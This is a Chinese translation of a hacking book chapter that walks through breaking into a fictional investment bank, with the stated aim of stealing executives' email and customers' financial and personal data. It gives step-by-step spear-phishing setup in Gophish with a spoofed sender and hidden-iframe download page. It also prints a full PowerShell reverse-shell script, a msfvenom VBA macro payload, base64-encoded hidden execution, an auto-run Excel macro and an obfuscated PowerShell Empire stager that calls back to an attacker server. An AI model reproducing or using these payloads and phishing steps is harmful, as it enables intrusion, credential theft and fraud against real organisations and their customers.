﻿# 第二章、入侵

> 万物皆有裂缝，这就是光线进入的方式。 -- *伦纳德科恩（Leonard Cohen）*

您找到了匿名免费接入互联网的完美地点，您已经设置了TOR / VPN网络，并且您有一个VPN充当前置堡垒。你感到颤抖，你准备好了！

我们的（假）目标将是一家名为Slash＆Paul's Holding（后续简称SPH）的公司。它是一家投资银行，为世界上一些最富有的客户管理资产。他们并不是特别邪恶;他们碰巧有巨额资金。

在启动我们的工具和技巧之前，先停一停，再次明确我们的（非）神圣目标：
+ 我们希望获得CEO的电子邮件，因为这只是一个常规操作！
+ 我们还想窃取和销售业务和人力资源数据：帐号，信用卡数据，员工信息等。
+ 但最重要的是，我们希望在各类监控手段下自由翱翔。

SPH的基础设施以广泛而简单的方式看起来可能如下所示：

![SPH基础设施](./Chap2/SPH-Infrastructure.png)


当然，这个图表过于简单化，因为真正的网络可能要复杂得多。但我们总会找到相同的通用元素:
- 非军事区（DMZ），以下称为蓝箱。它通常托管面向互联网的服务器，这使得所有标准都成为“不受信任”的区域，尽管有些公司坚持要求它几乎完全访问内部网络。
- 一个绿箱（对应上面的蓝箱），代表内部网络。它托管工作站，业务应用程序，电子邮件服务器，网络共享等。
- 然后是黑暗区域 - 我们根本不知道那里有什么。

这一切都取决于SPH的网络配置。在一个简单的工作中，大多数关键服务器都将是在绿箱中托管，将暗区缩小到包含一些相机和手机的小部分。但是，越来越多的公司正在转向保护防火墙层面的最重要资产，创建多个小型，孤立的网络。

但是，让我们不要走得太远，而是专注于下一步：如果我们足够幸运的话，在蓝箱(Bluebox)上面建立一个温暖的巢 - 甚至是绿箱(Greenbox)。

我们有几种选择:
-  网络钓鱼。到目前为止最受欢迎的选择;我们会在一点点看到原因。
-  攻击Bluebox中的公共服务器。更难，但效率更高。
-  需要虚假USB棒，硬件植入等的社会工程的深奥形式。我们将把它留给真正有动力的黑客。

## 2.1 钓鱼邮件

网络钓鱼是诱骗用户以某种方式削弱公司安全性的行为：点击链接，泄露密码，下载看似无害的软件，将钱汇到某个帐户等等。

经典的网络钓鱼攻击会针对成百上千的用户，以确保取得一定程度的成功。有针对性的网络钓鱼活动可以高达30％成功率。一些更隐蔽的攻击行为可能会针对少数关键员工高度定制邮件消息，即鱼叉式网络钓鱼。
从黑客的角度来看，网络钓鱼攻击是为了一个简单的原因而进行的攻击：如果我们成功，我们就会控制位于Greenbox内部的机器。这就像坐在公司办公室里，同时在公司网络上有一个帐户。无价！

现在，对于我们的网络钓鱼活动，我们需要一些关键要素:
- 员工列表及其电子邮件地址。 
- 一个好的电子邮件创意。
- 一个电子邮件发送平台。
- 一个隐蔽性好的恶意文件，让我们访问用户的机器。

让我们按顺序处理它们。

### 2.1.1.电子邮件
几乎每家公司都有一个公开网站，我们可以浏览以获取有关其业务，专业领域和联系信息的基本信息：常用电子邮件地址，电话号码等。
公司的电子邮件地址很重要，因为它提供了两个关键要素:
- 他们的电子邮件服务使用的域名（可能与官方网站的地址相同或不同）
- 电子邮件的格式：例如，是'name.surname@company.com'还是'first_letter_surname.name@company.com'？

访问网页 www.sph-assets.com/contact 时，我们会找到一个通用的联系地址：marketing@sph-assets.com。这本身并不是很有帮助，但只是发送电子邮件到这个地址将使我们得到在市场部门工作的真实人的回复。

![](./Chap2/2.Email.png)

非常好，我们从这封电子邮件中获得了两条有价值的信息:
- 电子邮件地址格式：姓氏的第一个字母后跟名字：pvilma @sph-assets.com。
- 电子邮件的图表：默认字体，公司图表颜色，签名格式等。

这些信息很关键，因为现在我们只需要在那里工作的人的全名来推断他们的电子邮件地址。感谢Facebook，Twitter和LinkedIn，这是小菜一碟。我们只需查看公司页面，找出喜欢使用它们的人，关注它或分享其内容。

可以用来自动执行此过程的一个有趣工具是TheHarvester ，它收集Google / Bing / Yahoo搜索结果中的电子邮件地址。然而，诉诸社交媒体可以提供最准确，最新的结果。

### 2.1.2.电邮内容
对于我们的网上钓鱼攻击，我们希望邀请其他人打开一个会执行恶意程序的文件。因此，我们的电子邮件需要足够吸引人，以便人们立即打开它，而不仅仅是打打哈欠然后归档它。

下面，你会发现一些想法，但我相信你可以拿出一些更狡猾的东西：
- 最新报告显示销售额急剧下降。
- Urgent 紧急发票需要立即结算。
- 最新的彭博报道。股东调查结果。
- 即将采访的一个新经理的简历。


电子邮件的内容应简明扼要，并模仿我们之前确定的公司电子邮件格式。电子邮件的源地址可能是您可以提出的任何虚构名称。实际上，大多数电子邮件服务器都允许您指定任何源地址而无需执行适当的验证。


互联网有很多开放的SMTP服务器，我们可以用来自由发送电子邮件，但我们只需要尽可能简单地设置我们自己的电子邮件服务器，它将连接到sph-assets.com并推送网络钓鱼邮件。相当全面而自动化的工具是Gophish。


一旦运行这个平台后，您就可以开始创建你的活动了。
我们首先配置“发送配置文科”：源电子邮件地址和SMTP服务器（localhost）。理想情况下，我们希望电子邮件地址靠近IT_support@sph-assets.com，但是，SPH的电子邮件服务器很可能禁止任何传入的电子邮件设置为xxx@sph-assets.com，这非常有意义。来自“@sph-assets.com”的所有电子邮件都应来自内部网络，而不是互联网。


因此，在“发送配置文件”菜单中，我们需要指定另一个域名，例如 sph-group.com。发送电子邮件不需要存在此域名。不要费心去创造它。此外，只要我们提出别名：“IT支持”<it-support@sph-group.com>，人们通常不会关注电子邮件发件人。

![](./Chap2/3.SendingProfile.png)

我们在“用户和群组”菜单中添加我们想要定位的用户，然后转到“电子邮件模板”以编写我们的消息内容：

![](./Chap2/4.MessageContent.png)


我们设计电子邮件的内容的方式类似于我们从市场人员那里获得的电子邮件（相同的签名，相同的图表颜色，相同的字体等）。该电子邮件将邀请用户单击下载文件的链接。该链接将由GoPhish自动填写（多亏{{.URL}}变量，如此的自动化）。
包含链接而不是直接附加恶意文件可以降低被垃圾邮件过滤器捕获的可能性。


我们在http://www.noip.com/上为前线阵地（Front Gun）服务器注册了一个免费的DNS名称。像sph- group.ddns.net这样的东西已经足够了。我们稍后在启动行动时，需要将此DNS名称指定为变量{{.URL}}的值。

由于我们不需要诱骗用户向我们提供凭据，因此我们不关心网页的内容。我们将自动触发文件下载，然后将其重定向到真正的SPH网站。在Gophish的“登陆页面”菜单中，我们粘贴以下代码:

```
<html>	
<iframe width="1" height="1" frameborder="0" src=" [File location on Gophish machine]"></iframe>
<iframe width="1" height="1" frameborder="0" src=" [File location on Gophish machine]"></iframe>
</html>
```


除了一个小细节：恶意软件之外，网络钓鱼活动已准备好启动。这将成为下一章的主题。

### 2.1.3 恶意文件
关于我们可以发送目标的文件类型，有几种可能性。但是，可执行（.exe）文件非常可疑，并且将被所有电子邮件客户端丢弃。我们将使用一些更聪明的东西：一个包含恶意代码的excel电子表格，它可以回连我们的服务器，获取执行命令，然后发回结果：反向shell。


#### 1)纯VBA
Visual Basic是一种脚本语言，可以嵌入到Office文档（Word，Excel，PowerPoint等）中。它在企业界大量使用用以处理数据。因此，员工习惯于在打开文档时执行宏（VBA代码）。

如果您是VBA专家，我相信您可以快速创造能与我们的Front Gun服务器通信的代码，检索执行命令，然后在受感染的计算机上执行它们。然而，由于VBA对我来说绝非小菜一碟，所以我将依靠自动框架提供的多种工具来攻击系统和生成有效载荷:Metasploit. 它默认安装在Kali Linux上。


由于我们首先要测试代码，因此我们使用Netcat工具在Front Gun服务器上设置了一个监听器。它通常被称为黑客的瑞士军刀。它只是发送和接收原始套接字连接，但它也可以用于获取反向shell，传输文件等。

此命令将打开端口443并等待传入连接：
`root@FrontGun:~# nc -l -p 443	` 
接下来，我们使用Metasploit的msfvenom 用于生成恶意VBA攻击载荷：
```
root@FrontGun:~# msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp -e generic/none -f vba lhost=FrontGun_IP  lport=443
```
这将为x86架构生成反向shell攻击负载，无需任何特殊编码（通用/无）。我们将代码复制/粘贴到Excel宏中:

![](./Chap2/5.ExcelVBAPayload.png)

如果我们检查生成的代码，我们知道它执行以下操作:
- 通过调用过程Workbook_Open（在上图中不可见）打开文档时启动攻击负载;
- 定义一个包含执行反向连接和代码执行的实际代码的数组。它在x86汇编中，因此独立于所使用的语言（VBA，PowerShell等）;
- 分配一些可执行内存，然后shell代码会被复制并执行。

Metasploit几乎总是遵循这种模式来生成其有效载荷，无论使用何种语言。这使得防病毒解决方案能够标记此工具生成的任何内容变得微不足道。对隐身来说完全够用了。

我们可以轻松地添加加密函数来加密保存shellcode的变量，但让我们尝试一种全新的方法来减少障碍。

#### 2)PowerShell救援

PowerShell是Windows上最强大的脚本语言之一。它已迅速成为管理员最信任的工具 - 同样也是黑客最心爱的情妇。在这个网页上查看一些非常好的PS工具。

遵循与以前相同的模式，我们希望在PowerShell中生成反向shell，然后将其嵌入到Office文档中。我们从PS脚本开始。
```
#Open a socket connection
$client = New-Object System.Net.Sockets.TCPClient("FGUN_IP",4444);
$stream = $client.GetStream();

#Send shell prompt

$greeting = "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($greeting)
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flus [byte[]]$bytes = 0..255|%{0};

#Wait for response, execute whatever’s coming, then loop back

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path +"> ";
    $sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

为了确保脚本正常工作，我们使用以下命令在普通的Windows机器上执行它：
`C:\examples> Powershell -Exec Bypass .\reverse.ps1 `



在Front Gun服务器上，我们在端口4444上设置了监听器:

![](./Chap2/6.Listener.png)

漂亮！我们在远程（测试）机器上进行远程执行。理想情况下，我们希望使用类似的VBA代码来调用此脚本:

```VBA> Shell ("powershell c:\temp\reverse.ps1 ")```

但是我们需要在将脚本写入到目标磁盘上，这可能会触发更多告警。避免这种情况的一种方法是使用PowerShell的内联命令执行的强大功能！我们执行作为powershell.exe参数传递过来的一串代码，从而替代执行一个脚本文件。


我们首先在每条指令的末尾添加一个分号';':
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.11",4444);
$stream = $client.GetStream();

$greeting = "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($greeting);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flus [byte[]]$bytes = 0..255|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```


然后我们在Linux上用Unicode base64编码脚本的内容:
```
FrontGun$ cat reverse.ps1 | iconv -f UTF8 -t UTF16LE | base64
```

![](./Chap2/7.Encode.png)


<br>
<br>

我们可以使用编码命令作为inline参数来调用此代码:

![](./Chap2/8.InlineArg.png)


'-W hidden'参数将PowerShell隐藏在后台。最后一步是在用户打开Office文档时调用此过程 -  Launch_me（）:
```
Sub Workbook_Open()	
 	Launch_me()	 
End Sub
```

我们可以进一步调整这个VBA宏，使其不那么容易阅读，但仍然让它可以正常工作。一个有趣的工具是Lucky Strike。它提供了漂亮的功能，如使用用户的电子邮件域（@sph-assets.com）加密和其他有用的选项。


#### 3)The Empire strikes
之前的有效载荷很好，但在现场情况下它有一些主要的限制:
- 因为我们使用原始套接字来启动连接，所以使用Web代理访问互联网的工作站（很可能）将无法连接回来。
- 我们的Netcat监听器每次只接受一个连接。不适合针对数百名用户的网络钓鱼行动。
- 我们使用的shell是相当基本的。有一些自动命令可能会更有趣，例如启动键盘记录器，嗅探密码等。

这就是臭名昭着的PowerShell Empire 派上用场的地方。它是一个框架，提供一个能够处理多个受感染用户的监听器，但也为shell提供了一些有趣的命令，如获取明文密码，数据透视，权限提升等。


按照此博客文章[http://www.powershellempire.com/?page_id=110]下载并安装Empire PS（ 基本上复制Git存储库并启动 install. sh ）。


在欢迎屏幕上，转到监听器菜单（命令监听器）并列出默认位置info命令:

![](./Chap2/9.info.png)

<br/>
通过发出set命令设置正确的端口和地址（例如，设置端口443）。然后通过发出run <Listener_name>来执行监听器。


现在我们需要生成回连此监听器的PowerShell代码。我们将这段代码称为“stager”或“agent”:
```
[SysTeM.NET.SErVicePOinTMaNAGer]::EXPeCt10 = 0;
$wC=NEw-ObjEct SYstEM.Net.WEbCLIenT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$Wc.HeaderS.Add('User-Agent',$u);
$Wc.PROXy= [SystEm.NEt.WebREQuest]::DefAuLtWEBPROxy;
$W [SYsTEM.NeT.CREDENtiAlCAChe]::DefAulTNeTwORK[chAr[]]$b=([cHaR[]] ($WC.DowNLOAdStrinG("http://<Front_Gun>:443/index.{$_-bXor$K[$i++%$k.LEngTH]};
IEX ($B-joIn'')
```
<br/>
您可以看到代理使用对称加密密钥来传输有效负载并很好地处理工作站上定义的任何潜在代理。在远程计算机上执行脚本时，我们会在Front Gun服务器上收到新通知。

![](./Chap2/10.Stager.png)


> 翻译：2hu2huxia  2019/8/16



